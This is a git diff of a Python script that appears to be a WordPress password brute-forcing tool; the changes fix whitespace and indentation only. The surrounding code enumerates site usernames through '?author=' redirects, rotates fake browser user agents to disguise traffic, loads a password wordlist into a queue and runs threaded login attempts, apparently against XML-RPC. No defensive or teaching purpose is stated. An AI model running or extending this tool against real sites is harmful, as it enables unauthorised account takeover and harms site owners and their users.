@@ -25,7 +25,8 @@ else:
 wordlist = input("Path to password wordlist: ")
 threads_count = int(input("Number of threads: "))                                       
 password_queue = Queue()
-                                                                                        fake_user_agents = [
+
+fake_user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",                                                              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
@@ -47,18 +48,17 @@ def find_usernames(url):
         try:
             author_url = f"{url}/?author={i}"
             response = requests.get(author_url, timeout=5, allow_redirects=True)
-            if response.status_code == 200 and response.url != author_url:                              username = response.url.rstrip("/").split("/")[-1]
+            if response.status_code == 200 and response.url != author_url:  
+                username = response.url.rstrip("/").split("/")[-1]  # Fixed indentation here
                 usernames.add(username)
         except Exception:
             continue
     return list(usernames)
 
-
 def load_passwords():
     with open(wordlist, "r") as f:
         for line in f:
             password_queue.put(line.strip())
-
 
 def parse_response(response_text):
     try:
@@ -67,7 +67,6 @@ def parse_response(response_text):
         return blog is not None
     except ET.ParseError:
         return False
-
 
 def brute_force(username):
     while not password_queue.empty():
@@ -98,7 +97,6 @@ def brute_force(username):
         except Exception as e:
             print(f"\033[1;31m[!] Error: {e}\033[0m")
         password_queue.task_done()
-
 
 usernames = find_usernames(target_url)
 if usernames:
